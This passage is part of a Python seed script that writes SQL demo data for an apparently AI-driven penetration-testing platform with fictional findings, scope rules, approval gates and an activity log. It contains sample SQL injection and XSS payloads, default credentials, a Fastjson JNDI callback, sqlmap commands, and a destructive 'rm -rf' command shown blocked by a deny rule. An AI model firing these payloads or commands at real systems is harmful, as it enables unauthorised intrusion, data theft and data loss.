        "digest",
        '{"summary":"Full chain proven: DMZ RCE \\u2192 cred reuse \\u2192 DC01 domain takeover"}',
        0,
        "active",
        "planner",
        "2026-11-14T00:35:00Z",
    )
)

# Exploration 9004 (Globex, early)
w(
    node(
        9170,
        9004,
        "begin",
        '{"summary":"Origin: globex.io surface mapping"}',
        0,
        "open",
        "system",
        "2026-11-20T08:00:00Z",
    )
)
w(
    node(
        9171,
        9004,
        "goal",
        '{"text":"Map globex.io attack surface","vulnclass":"Recon"}',
        5,
        "open",
        "goals",
        "2026-11-20T08:01:00Z",
    )
)
w(
    node(
        9172,
        9004,
        "intent",
        '{"summary":"Subdomain + technology enumeration on globex.io"}',
        6,
        "open",
        "planner",
        "2026-11-20T08:05:00Z",
    )
)
w()

w(
    "-- ============ 7. Exploration edges (spawns / derived_from / yields / proves / covers) ============"
)


def edge(exp, src, dst, rel):
    return f"INSERT INTO exploration_edges (exploration_id,src_id,dst_id,rel) VALUES ({exp},{src},{dst},'{rel}');"


E = []
# exp 9001
for s, d in [(9101, 9102), (9101, 9103)]:
    E.append(edge(9001, s, d, "spawns"))
for s, d in [
    (9102, 9104),
    (9102, 9105),
    (9103, 9106),
    (9102, 9107),
    (9102, 9108),
    (9102, 9109),
    (9102, 9110),
]:
    E.append(edge(9001, s, d, "spawns"))
for s, d in [(9107, 9111), (9105, 9112), (9108, 9113), (9110, 9114)]:
    E.append(edge(9001, s, d, "yields"))
for s, d in [(9111, 9115), (9112, 9116), (9113, 9117)]:
    E.append(edge(9001, s, d, "yields"))
for s, d in [(9115, 9102), (9116, 9102)]:
    E.append(edge(9001, s, d, "proves"))
E.append(edge(9001, 9113, 9118, "yields"))
E.append(edge(9001, 9118, 9105, "derived_from"))
E.append(edge(9001, 9119, 9106, "derived_from"))
for d in (9111, 9112, 9113):
    E.append(edge(9001, 9120, d, "covers"))
# exp 9002
E.append(edge(9002, 9130, 9131, "spawns"))
E.append(edge(9002, 9131, 9132, "spawns"))
E.append(edge(9002, 9131, 9133, "spawns"))
E.append(edge(9002, 9132, 9134, "yields"))
E.append(edge(9002, 9134, 9135, "yields"))
E.append(edge(9002, 9133, 9136, "yields"))
E.append(edge(9002, 9135, 9131, "proves"))
# exp 9003
E.append(edge(9003, 9150, 9151, "spawns"))
for d in (9152, 9153, 9154, 9155, 9156):
    E.append(edge(9003, 9151, d, "spawns"))
E.append(edge(9003, 9152, 9157, "yields"))
E.append(edge(9003, 9157, 9153, "derived_from"))
E.append(edge(9003, 9153, 9158, "yields"))
E.append(edge(9003, 9158, 9151, "proves"))
E.append(edge(9003, 9153, 9159, "yields"))
E.append(edge(9003, 9159, 9154, "derived_from"))
E.append(edge(9003, 9160, 9158, "covers"))
# exp 9004
E.append(edge(9004, 9170, 9171, "spawns"))
E.append(edge(9004, 9171, 9172, "spawns"))
for e in E:
    w(e)
w()

w(
    "-- ============ 8. Exploration anchors (test directions -> concrete assets) ============"
)


def anchor(node_id, asset_id):
    return f"INSERT INTO exploration_anchors (node_id,asset_id) VALUES ({node_id},{asset_id});"


ANCH = [
    (9104, 9001),
    (9104, 9006),
    (9107, 9012),
    (9107, 9009),
    (9111, 9012),
    (9115, 9012),
    (9105, 9005),
    (9112, 9005),
    (9116, 9005),
    (9108, 9002),
    (9113, 9002),
    (9117, 9002),
    (9106, 9005),
    (9119, 9005),
    (9132, 9013),
    (9134, 9013),
    (9135, 9013),
    (9133, 9003),
    (9136, 9003),
    (9131, 9010),
    (9152, 9004),
    (9157, 9011),
    (9153, 9011),
    (9158, 9011),
    (9154, 9008),
    (9172, 9015),
    (9172, 9016),
]
for n, a in ANCH:
    w(anchor(n, a))
w()

w(
    "-- ============ 9. Task constraints (allow = in-scope intent, deny = out-of-scope) ============"
)


def constraint(exp, kind, text, origin):
    return f"INSERT INTO task_constraints (exploration_id,kind,text,origin) VALUES ({exp},'{kind}','{q(text)}','{origin}');"


w(constraint(9001, "allow", "Test acme.com and all *.acme.com subdomains", "goals"))
w(
    constraint(
        9001, "deny", "Do NOT touch vpn.acme.com or attempt VPN brute-force", "operator"
    )
)
w(constraint(9001, "deny", "No destructive payloads; read-only proof only", "operator"))
w(constraint(9002, "allow", "Authz and injection testing on api.acme.com", "goals"))
w(
    constraint(
        9003,
        "allow",
        "Full-chain exploitation permitted within 203.0.113.0/24",
        "operator",
    )
)
w(constraint(9004, "deny", "Recon only; no exploitation on globex.io", "operator"))
w()

w("-- ============ 10. Task scope (in-scope boundaries) ============")


def tscope(
    task, kind, domain="NULL", net="NULL", value="NULL", company="NULL", source="auto"
):
    return (
        f"INSERT INTO task_scope (task_id,kind,company_id,domain,net,value,source) "
        f"VALUES ({task},'{kind}',{company},{domain},{net},{value},'{source}');"
    )


w(tscope(9001, "company", company="9001", source="manual"))
w(tscope(9001, "root_domain", domain="'acme.com'", source="auto"))
w(tscope(9001, "subdomain", domain="'www.acme.com'", source="auto"))
w(tscope(9001, "subdomain", domain="'admin.acme.com'", source="agent"))
w(tscope(9001, "cidr", net="'203.0.113.0/24'", source="auto"))
w(tscope(9002, "company", company="9001", source="manual"))
w(tscope(9002, "subdomain", domain="'api.acme.com'", source="auto"))
w(tscope(9003, "cidr", net="'203.0.113.0/24'", source="manual"))
w(tscope(9004, "company", company="9002", source="manual"))
w(tscope(9004, "root_domain", domain="'globex.io'", source="auto"))
w()

w("-- ============ 11. Coverage ledger (what was tested & the outcome) ============")


def cov(task, surface, risk, outcome, reason, worker="worker", intent="NULL"):
    return (
        f"INSERT INTO coverage_ledger (task_id,surface,risk_area,outcome,reason,worker,intent_id) "
        f"VALUES ({task},'{q(surface)}','{risk}','{outcome}','{q(reason)}','{worker}',{intent})"
    )


COV = [
    cov(
        9001,
        "www.acme.com/search",
        "sql injection",
        "reported",
        "Error-based SQLi confirmed, finding filed",
        intent="9107",
    ),
    cov(
        9001,
        "www.acme.com/search",
        "reflected xss",
        "needs_follow_up",
        "Reflection seen, filter bypass still pending",
        intent="9109",
    ),
    cov(
        9001,
        "admin.acme.com",
        "default credentials",
        "reported",
        "admin/admin123 accepted",
        intent="9105",
    ),
    cov(
        9001,
        "www.acme.com",
        "exposed .git",
        "reported",
        "/.git/HEAD returned 200",
        intent="9108",
    ),
    cov(
        9001,
        "vpn.acme.com",
        "credential bruteforce",
        "not_applicable",
        "Out of scope (operator deny)",
        intent="9110",
    ),
    cov(
        9002,
        "api.acme.com/v1/orders",
        "idor",
        "reported",
        "Cross-tenant read proven",
        intent="9132",
    ),
    cov(
        9002,
        "api.acme.com",
        "weak jwt",
        "reported",
        "HS256 key cracked offline",
        intent="9133",
    ),
    cov(
        9003,
        "shop.acme.com/api/import",
        "deserialization rce",
        "reported",
        "Fastjson gadget executed",
        intent="9153",
    ),
    cov(
        9003,
        "203.0.113.0/24",
        "kerberoast",
        "ruled_out",
        "No crackable SPN hashes recovered",
        intent="9155",
    ),
    cov(
        9003,
        "internal-smb",
        "smb relay",
        "no_issue_found",
        "SMB signing enforced",
        intent="9156",
    ),
]
for c in COV:
    w(c + ";")
w()

w(
    "-- ============ 12. Findings (standalone table: severities + statuses + verification) ============"
)


def finding(
    id,
    task,
    node,
    vulnclass,
    name,
    sev,
    status,
    summary,
    evidence,
    asset_ids,
    report="",
    verification="unverified",
    poe=0,
    report_state="none",
    ts="2026-11-14T00:00:00Z",
    counter="",
    rationale="",
):
    aid = "'[" + ",".join(str(a) for a in asset_ids) + "]'"
    return (
        f"INSERT INTO findings (id,task_id,node_id,vulnclass,name,severity,status,summary,evidence,"
        f"asset_ids,report,verification_status,poe_level,report_state,counterevidence,confidence_rationale,created_at,worker) VALUES "
        f"({id},{task},{node},'{q(vulnclass)}','{q(name)}','{sev}','{status}','{q(summary)}','{q(evidence)}',"
        f"{aid}::jsonb,'{q(report)}','{verification}',{poe},'{report_state}','{q(counter)}','{q(rationale)}','{ts}','worker');"
    )


SQLI_REPORT = (
    "## Overview\\n\\n`www.acme.com/search` has **error-based SQL injection** (MSSQL) in the `q` "
    "parameter.\\n\\n## Reproduction\\n\\n```\\nGET /search?q=1' AND 1=CONVERT(int,@@version)--\\n```\\n\\n"
    "The response echoes the MSSQL version in a conversion error.\\n\\n## Remediation\\n\\nUse parameterized "
    "queries; disable verbose errors in production; apply least-privilege DB accounts."
)
w(
    finding(
        9001,
        9001,
        9115,
        "SQL Injection",
        "Error-based SQL injection in the site search API",
        "high",
        "confirmed",
        "Error-based SQL injection in the q parameter of www.acme.com/search",
        "GET /search?q=1' AND 1=CONVERT(int,@@version)-- returns an MSSQL version error.",
        [9012, 9009],
        report=SQLI_REPORT,
        verification="verified",
        poe=3,
        report_state="submitted",
        ts="2026-11-14T01:20:00Z",
        rationale="Reproduced twice; version string leaked deterministically.",
    )
)
w(
    finding(
        9002,
        9002,
        9135,
        "IDOR",
        "Broken object-level authorization on /v1/orders",
        "high",
        "confirmed",
        "api.acme.com/v1/orders?id= reads other users' orders without authorization",
        "id=1001 -> id=1002 returns another customer's order incl. PII; no ownership check.",
        [9013],
        verification="verified",
        poe=3,
        report_state="submitted",
        ts="2026-11-14T02:44:00Z",
    )
)
w(
    finding(
        9003,
        9002,
        9136,
        "Weak JWT",
        "Weak HS256 signing key allows token forgery",
        "high",
        "in_progress",
        "API JWT uses a weak key and can be cracked offline to forge tokens",
        "HS256 with key 'secret'; cracked in ~5s with john -> any sub can be forged.",
        [9003, 9010],
        verification="unverified",
        ts="2026-11-14T03:02:00Z",
    )
)
w(
    finding(
        9004,
        9001,
        9117,
        "Exposed .git",
        "Exposed .git directory discloses source code",
        "medium",
        "confirmed",
        "www.acme.com exposes the .git directory; source can be recovered",
        "GET /.git/HEAD -> 200; git-dumper recovered source with a commented DB connection string.",
        [9002],
        verification="verified",
        poe=3,
        ts="2026-11-13T20:30:00Z",
    )
)
w(
    finding(
        9005,
        9003,
        9158,
        "Deserialization RCE",
        "Fastjson deserialization RCE on /api/import",
        "critical",
        "resolved",
        "Unauthenticated Fastjson RCE on shop.acme.com/api/import",
        "@type JdbcRowSetImpl gadget triggers JNDI/LDAP callback; `id` ran as www-data.",
        [9011, 9004],
        verification="verified",
        poe=4,
        report_state="accepted",
        ts="2026-11-13T16:00:00Z",
        rationale="Out-of-band LDAP callback + command output captured.",
    )
)
w(
    finding(
        9006,
        9001,
        9116,
        "Default Credentials",
        "Admin console uses default credentials",
        "high",
        "confirmed",
        "admin.acme.com admin console accepts admin/admin123",
        "Login succeeded; full admin console access to users and orders.",
        [9005],
        verification="verified",
        poe=3,
        ts="2026-11-14T03:50:00Z",
    )
)
w(
    finding(
        9007,
        9001,
        9109,
        "Reflected XSS",
        "Reflected XSS in search result title",
        "medium",
        "pending",
        "Search page does not escape the q parameter",
        "q=<script>alert(document.domain)</script> reflected in the result title (filter bypass pending).",
        [9012],
        verification="not_assessed",
        ts="2026-11-13T22:10:00Z",
        counter="Basic payload reflected; WAF may block weaponized variants — unconfirmed.",
    )
)
w(
    finding(
        9008,
        9004,
        "NULL",
        "Missing Security Headers",
        "Storefront missing HSTS/CSP headers",
        "low",
        "false_positive",
        "store.globex.io is missing HSTS and CSP headers",
        "No Strict-Transport-Security or Content-Security-Policy on 200 responses.",
        [9018],
        verification="false_positive",
        ts="2026-11-20T08:20:00Z",
        counter="Cloudflare injects HSTS at the edge; header present in production path.",
    )
)
# Use Case 1: two findings from DIFFERENT tasks attach to the same canonical endpoint #9210.
w(
    finding(
        9009,
        9006,
        "NULL",
        "IDOR",
        "IDOR on /api/v2/invoices/{id}",
        "high",
        "confirmed",
        "Billing API returns other tenants' invoices by changing {id}",
        "GET /api/v2/invoices/1002 returns another customer's invoice; no ownership check.",
        [9210],
        verification="verified",
        poe=3,
        ts="2026-11-22T11:00:00Z",
    )
)
w(
    finding(
        9010,
        9005,
        "NULL",
        "Verbose Error",
        "Stack trace disclosure on /api/v2/invoices",
        "medium",
        "confirmed",
        "Malformed {id} returns a framework stack trace disclosing internals",
        "GET /api/v2/invoices/x triggers a 500 with a full stack trace and DB driver details.",
        [9210],
        verification="verified",
        poe=3,
        ts="2026-11-21T12:00:00Z",
    )
)
w()

w(
    "-- ============ 13. Traffic evidence snapshots + finding bindings (proof receipts) ============"
)
w(
    "INSERT INTO traffic_evidence_snapshots (id,source_traffic_id,captured_at,url,method,status,content_type,req_head,resp_head,req_hash,resp_hash,req_len,resp_len) VALUES"
)
w(",\n".join(snap_rows) + ";")
w(
    "INSERT INTO finding_traffic_bindings (finding_id,snapshot_id,role,note,position) VALUES"
)
w(",\n".join(binding_rows) + ";")
w()

w("-- ============ 14. Finding retest (manual re-verification session) ============")
w(
    "INSERT INTO conversations (id,agent_key,title) VALUES (9001,'retester','Retest: Fastjson RCE on shop.acme.com');"
)
w("""INSERT INTO finding_retests (id,finding_id,conversation_id,status,verdict,notes,snapshot,summary,evidence,created_at,started_at,finished_at) VALUES
 (9001,9005,9001,'completed','reproduced','Re-ran the gadget after the reported patch window.',
  '{"vulnclass":"Deserialization RCE","severity":"critical","target":"shop.acme.com/api/import"}'::jsonb,
  'Still exploitable: callback fired and `id` returned www-data.',
  'POST /api/import @type gadget -> LDAP callback to 10.8.0.5:1389 -> command executed.',
  '2026-11-18T10:00:00Z','2026-11-18T10:00:05Z','2026-11-18T10:03:00Z');""")
w()

w(
    "-- ============ 15. Interception rules + pending approval gates (human-in-the-loop) ============"
)
w("""INSERT INTO intercept_rules (id,name,enabled,priority,match_target,match_type,pattern,action,message,timeout_seconds,timeout_action) VALUES
 (9001,'Allow read-only recon tools',true,100,'tool_input','argv','["nuclei","-silent"]','allow','Auto-approved: passive recon',60,'deny'),
 (9002,'Ask before sqlmap',true,90,'tool_input','argv','["sqlmap"]','ask','sqlmap can be intrusive — approve per target',120,'deny'),
 (9003,'Deny destructive shell',true,110,'tool_input','regex','rm\\\\s+-rf|mkfs|dd\\\\s+if=','deny','Blocked destructive command',60,'deny');""")
w("""INSERT INTO intercept_pending (id,rule_id,task_id,agent_name,tool_name,tool_input,status,reason,decision_source,decided_by,decided_at,target_key,created_at) VALUES
 (9001,9002,'9001','worker','Bash','{"command":"sqlmap -u https://www.acme.com/search?q=1 --batch --dbs"}'::jsonb,'pending','sqlmap can be intrusive — approve per target','rule','', NULL,NULL,'2026-11-14T04:00:00Z'),
 (9002,NULL,'9002','worker','WebFetch','{"url":"https://api.acme.com/v1/orders?id=1002"}'::jsonb,'pending','Target approval required (target gate)','','', NULL,'api.acme.com:443','2026-11-14T02:40:00Z'),
 (9003,9002,'9003','worker','Bash','{"command":"sqlmap -u https://shop.acme.com/api/import --batch"}'::jsonb,'allowed','Operator approved for shop.acme.com','human','human','2026-11-13T15:05:00Z',NULL,'2026-11-13T15:04:00Z'),
 (9004,9003,'9003','worker','Bash','{"command":"rm -rf /opt/app/logs"}'::jsonb,'denied','Blocked destructive command','rule','rule','2026-11-13T16:20:00Z',NULL,'2026-11-13T16:19:00Z'),
 (9005,9001,'9003','worker','Bash','{"command":"nuclei -silent -u https://shop.acme.com"}'::jsonb,'allowed','Auto-approved: passive recon','rule','rule','2026-11-13T14:21:00Z',NULL,'2026-11-13T14:20:00Z');""")
w()

w(
    "-- ============ 16. Target pins (approved hosts for live target gating) ============"
)
w("""INSERT INTO target_pins (id,task_id,host,port,version,pinned_ips,resolver,status,intercept_id,decided_by,decided_from,created_at) VALUES
 (9001,9003,'shop.acme.com',443,1,ARRAY['203.0.113.12'],'system','active',9003,'human','127.0.0.1','2026-11-13T15:05:00Z'),
 (9002,9003,'203.0.113.12',8080,1,ARRAY['203.0.113.12'],'system','active',NULL,'human','127.0.0.1','2026-11-13T15:10:00Z'),
 (9003,9001,'vpn.acme.com',443,1,ARRAY['198.51.100.20'],'system','revoked',NULL,'human','127.0.0.1','2026-11-13T10:00:00Z');""")
w(
    "UPDATE target_pins SET revoked_at='2026-11-13T12:00:00Z', revoked_reason='operator' WHERE id=9003;"
)
w()

w(
    "-- ============ 17. Activity timeline (tool calls for the sessions view) ============"
)


def act(
    exp,
    node,
    worker,
    kind,
    tool,
    summary,
    err="false",
    it="1200",
    ot="800",
    ts="2026-11-14T01:00:00Z",
):
    toolv = f"'{tool}'" if tool else "NULL"
    nodev = str(node) if node else "NULL"
    return (
        f"INSERT INTO activity (exploration_id,node_id,worker,kind,tool,is_error,summary,input_tokens,output_tokens,created_at) "
        f"VALUES ({exp},{nodev},'{worker}','{kind}',{toolv},{err},'{q(summary)}',{it},{ot},'{ts}');"
    )


ACTS = [
    act(
        9001,
        9104,
        "worker",
        "tool_use",
        "Bash",
        "subfinder -d acme.com",
        ts="2026-11-12T09:21:00Z",
    ),
    act(
        9001,
        9104,
        "worker",
        "tool_result",
        "Bash",
        "Found 5 subdomains",
        ts="2026-11-12T09:22:00Z",
    ),
    act(
        9001,
        9107,
        "worker",
        "tool_use",
        "WebFetch",
        "GET /search?q=1' AND 1=CONVERT(int,@@version)--",
        ts="2026-11-14T01:15:00Z",
    ),
    act(
        9001,
        9107,
        "worker",
        "tool_result",
        "WebFetch",
        "HTTP 500 MSSQL conversion error (injectable)",
        ts="2026-11-14T01:16:00Z",
    ),
    act(
        9001,
        9115,
        "worker",
        "finding",
        None,
        "Filed: Error-based SQLi on /search",
        ts="2026-11-14T01:20:00Z",
    ),
    act(
        9001,
        9105,
        "worker",
        "tool_use",
        "WebFetch",
        "POST /login admin/admin123",
        ts="2026-11-14T03:49:00Z",
    ),
    act(
        9001,
        9105,
        "worker",
        "tool_result",
        "WebFetch",
        "HTTP 302 -> /admin/dashboard (auth OK)",
        ts="2026-11-14T03:50:00Z",
    ),
    act(
        9001,
        None,
        "planner",
        "result",
        None,
        "Round 7: goal g1 met; spawning data-read intents",
        it="5400",
        ot="1800",
        ts="2026-11-14T03:55:00Z",
    ),
    act(
        9002,
        9132,
        "worker",
        "tool_use",
        "WebFetch",
        "GET /v1/orders?id=1002",
        ts="2026-11-14T02:43:00Z",
    ),
    act(
        9002,
        9132,
        "worker",
        "tool_result",
        "WebFetch",
        "200 OK: returns another customer's PII",
        ts="2026-11-14T02:43:30Z",
    ),
    act(
        9003,
        9153,
        "worker",
        "tool_use",
        "Bash",
        "curl -XPOST shop.acme.com/api/import (fastjson gadget)",
        ts="2026-11-13T15:40:00Z",
    ),
    act(
        9003,
        9153,
        "worker",
        "tool_result",
        "Bash",
        "LDAP callback received; id -> www-data",
        ts="2026-11-13T15:41:00Z",
    ),
]
for a in ACTS:
    w(a)
w()

w("-- ============ 18. Keep sequences ahead of the explicit demo ids ============")
for tbl in [
    "companies",
    "assets",
    "explorations",
    "exploration_nodes",
    "tasks",
    "findings",
    "intercept_rules",
    "intercept_pending",
    "target_pins",
    "llm_profiles",
    "finding_retests",
    "conversations",
    "company_scope",
    "task_scope",
    "coverage_ledger",
    "task_constraints",
    "activity",
    "finding_traffic_bindings",
]:
    w(
        f"SELECT setval(pg_get_serial_sequence('{tbl}','id'), GREATEST((SELECT COALESCE(MAX(id),1) FROM {tbl}), 1));"
    )
w()
w("COMMIT;")
w("-- demo seed complete.")

sys.stdout.write("\n".join(SQL) + "\n")
sys.stderr.write(
    f"[seed_demo] wrote evidence blobs under {EVIDENCE_DIR}/blobs ; emitted {len(SQL)} SQL lines\n"
)
